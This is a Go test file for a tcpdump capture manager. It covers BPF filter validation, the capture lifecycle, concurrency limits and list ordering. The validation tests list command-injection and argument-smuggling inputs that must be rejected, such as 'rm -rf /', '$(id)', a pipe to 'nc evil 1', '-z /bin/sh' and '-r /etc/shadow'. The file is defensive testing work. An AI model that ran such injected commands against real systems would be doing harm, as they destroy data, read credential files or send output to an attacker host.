package pcap

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func haveTcpdump() bool {
	for _, p := range tcpdumpSearchPaths {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return true
		}
	}
	return false
}

func TestValidateFilter(t *testing.T) {
	cases := []struct {
		in  string
		bad bool
	}{
		{"host 1.2.3.4", false},
		{"host 1.2.3.4 and port 443", false},
		{"port 53", false},
		{"", false},
		{"host 1.2.3.4; rm -rf /", true},
		{"$(id)", true},
		{"host 1.2.3.4 && echo x", true},
		{"host `id`", true},
		{"host 1.2.3.4 | nc evil 1", true},
		// Argv flag smuggling — these would be interpreted as tcpdump
		// flags rather than BPF expression tokens. Must reject.
		{"-z /bin/sh", true},
		{"-r /etc/shadow", true},
		{"-W 999", true},
		{"-V file", true},
		{"host 1.2.3.4 -z /bin/sh", true},
		{"port 443 -r /etc/passwd", true},
		{"-- host 1.2.3.4", true},
	}
	for _, c := range cases {
		_, err := validateFilter(c.in)
		if c.bad && err == nil {
			t.Errorf("expected reject for %q", c.in)
		}
		if !c.bad && err != nil {
			t.Errorf("expected accept for %q, got %v", c.in, err)
		}
	}
}

func TestStartStopDelete(t *testing.T) {
	if !haveTcpdump() {
		t.Skip("tcpdump not installed")
	}
	if os.Geteuid() != 0 {
		// tcpdump needs CAP_NET_RAW; on non-root CI, capture will exit
		// with an error but the lifecycle still progresses to "error"
		// status which is fine for the lifecycle assertions below.
		t.Log("not root — capture will fail to bind but lifecycle still tested")
	}
	dir := t.TempDir()
	m, err := NewManager(dir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	rec, err := m.Start(context.Background(), "host 127.0.0.1", "loopback test", 2*time.Second, 1)
	if err != nil {
		t.Fatalf("Start: %v", err)
	}
	if rec.ID == "" {
		t.Fatal("empty id")
	}
	// Wait for it to stop naturally (2s + slop).
	deadline := time.Now().Add(15 * time.Second)
	var final Capture
	for time.Now().Before(deadline) {
		c, ok := m.Get(rec.ID)
		if !ok {
			t.Fatal("capture vanished")
		}
		if c.Status != "running" {
			final = c
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if final.ID == "" {
		t.Fatal("capture did not exit in time")
	}
	// File should exist (even on permission error tcpdump usually
	// writes the header before failing — but treat absence as soft
	// fail).
	if _, err := os.Stat(filepath.Join(dir, rec.ID+".pcap")); err != nil {
		t.Logf("pcap file missing (likely permission denied without root): %v", err)
	}
	// Delete cleans up.
	if err := m.Delete(rec.ID); err != nil {
		t.Fatalf("Delete: %v", err)
	}
	if _, ok := m.Get(rec.ID); ok {
		t.Fatal("expected capture gone after delete")
	}
}

func TestRejectMaliciousFilter(t *testing.T) {
	if !haveTcpdump() {
		t.Skip("tcpdump not installed")
	}
	dir := t.TempDir()
	m, err := NewManager(dir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	_, err = m.Start(context.Background(), "host 1.2.3.4; rm -rf /", "", time.Second, 1)
	if err == nil {
		t.Fatal("expected reject")
	}
}

func TestMaxConcurrent(t *testing.T) {
	if !haveTcpdump() {
		t.Skip("tcpdump not installed")
	}
	dir := t.TempDir()
	m, err := NewManager(dir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	oldMax := MaxConcurrent
	MaxConcurrent = 2
	defer func() { MaxConcurrent = oldMax }()
	ids := []string{}
	for i := 0; i < MaxConcurrent; i++ {
		rec, err := m.Start(context.Background(), "host 127.0.0.1", "", 5*time.Second, 1)
		if err != nil {
			t.Fatalf("Start %d: %v", i, err)
		}
		ids = append(ids, rec.ID)
	}
	if _, err := m.Start(context.Background(), "host 127.0.0.1", "", 5*time.Second, 1); err == nil {
		t.Fatal("expected concurrency cap to trip")
	}
	for _, id := range ids {
		_ = m.Stop(id)
		_ = m.Delete(id)
	}
}

func TestListOrdering(t *testing.T) {
	dir := t.TempDir()
	if !haveTcpdump() {
		// Build manager-less list test path.
		_, err := NewManager(dir)
		if err != nil {
			t.Skip("tcpdump not installed and NewManager refuses")
		}
		return
	}
	m, err := NewManager(dir)
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	// Fabricate two captures by hand to avoid spawning two tcpdumps.
	m.mu.Lock()
	m.captures["a"] = &captureRun{rec: Capture{ID: "a", Status: "stopped", StartedAt: time.Now().Add(-time.Hour)}, doneCh: make(chan struct{})}
	m.captures["b"] = &captureRun{rec: Capture{ID: "b", Status: "running", StartedAt: time.Now().Add(-30 * time.Minute)}, doneCh: make(chan struct{})}
	m.captures["c"] = &captureRun{rec: Capture{ID: "c", Status: "stopped", StartedAt: time.Now().Add(-2 * time.Hour)}, doneCh: make(chan struct{})}
	m.mu.Unlock()
	list := m.List()
	if len(list) != 3 {
		t.Fatalf("want 3 got %d", len(list))
	}
	if list[0].Status != "running" {
		t.Fatalf("running should sort first, got %q", list[0].Status)
	}
	if list[1].ID != "a" || list[2].ID != "c" {
		t.Fatalf("stopped should be sorted by started_at desc, got %v / %v", list[1].ID, list[2].ID)
	}
}

func TestNoTcpdumpError(t *testing.T) {
	old := tcpdumpSearchPaths
	tcpdumpSearchPaths = []string{"/nonexistent/tcpdump"}
	defer func() { tcpdumpSearchPaths = old }()
	_, err := NewManager(t.TempDir())
	if err == nil {
		t.Fatal("expected error when tcpdump missing")
	}
}
